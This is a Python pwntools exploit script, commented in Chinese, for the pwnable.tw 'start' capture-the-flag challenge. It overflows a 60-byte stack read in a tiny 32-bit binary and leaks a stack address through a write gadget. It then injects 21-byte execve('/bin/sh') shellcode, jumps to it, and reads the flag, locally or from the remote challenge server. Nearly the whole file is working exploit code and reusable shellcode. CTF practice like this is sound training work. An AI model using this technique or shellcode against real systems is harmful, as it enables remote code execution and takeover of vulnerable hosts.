#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""pwnable.tw 10000 "start" —— ret2shellcode（栈可执行 + 栈地址泄漏）

题目：564 字节的 32 位静态汇编程序，没有 libc，没有任何符号。
保护：No PIE / 栈可执行（GNU_STACK = RWX）/ 无 canary / 无 RELRO 概念。

漏洞：
  read(0, esp, 0x3c)   一次 60 字节的栈溢出，且目标正是"当前栈顶"，
                       而栈上恰好保存着原始 esp（push esp）——天然的栈地址泄漏点。

利用链（两轮 read）：
  1) 覆盖返回地址为 0x08048087（`mov ecx,esp; mov bl,1; mov al,4; int 0x80`）
     -> write(1, esp, 20)，前 4 字节就是栈地址 leak
  2) 第二次 read 的目标为 leak-4，返回地址在 +0x14，shellcode 放在 +0x18
     -> ret 直接落到栈上的 execve("/bin/sh") 机器码（EXECSTACK）

用法：
  python 21_pwnable_start_exp.py            # 本地（当前目录需有 pwnable_start）
  python 21_pwnable_start_exp.py REMOTE     # 远程 chall.pwnable.tw:10000
"""

import sys
import time

from pwn import *

context(os="linux", arch="i386", log_level="info")

BIN = "./pwnable_start"
HOST, PORT = "chall.pwnable.tw", 10000

# 0x08048087: mov ecx, esp
#             mov dl, 0x14
#             mov bl, 1
#             mov al, 4
#             int 0x80          -> write(1, esp, 20)
GADGET_LEAK = 0x08048087

# 21 字节 execve("/bin/sh", NULL, NULL)
# xor edx,edx | push edx | push "//sh" | push "/bin" | mov ebx,esp
# xor ecx,ecx | mov al,0xb | int 0x80
SHELLCODE = bytes.fromhex("31d252682f2f7368682f62696e89e331c9b00bcd80")


def start() -> tube:
    if len(sys.argv) > 1 and sys.argv[1].upper() == "REMOTE":
        return remote(HOST, PORT)
    return process(BIN)


def pwn() -> None:
    io = start()

    # ---------- 第一轮：泄漏栈地址 ----------
    io.recvuntil(b"Let's start the CTF:")
    # 20 字节覆盖掉 "Let's start the CTF:" 本身，再 4 字节覆盖 [esp+0x14] 的返回地址
    io.send(b"A" * 0x14 + p32(GADGET_LEAK))
    leak = u32(io.recvn(4))
    log.success("stack leak: %#x", leak)

    # ---------- 第二轮：把 shellcode 写到栈上并跳过去 ----------
    # 第二次 read 的目标 = leak-4（保存原始 esp 的那个位置），
    # 返回地址位于 payload+0x14，shellcode 位于 payload+0x18
    io.send(b"A" * 0x14 + p32(leak - 4 + 0x18) + SHELLCODE)

    time.sleep(0.2)
    io.sendline(b"echo __PWNED__; cat flag.txt")
    print(io.recvrepeat(1.5).decode(errors="replace"))
    io.close()


if __name__ == "__main__":
    pwn()
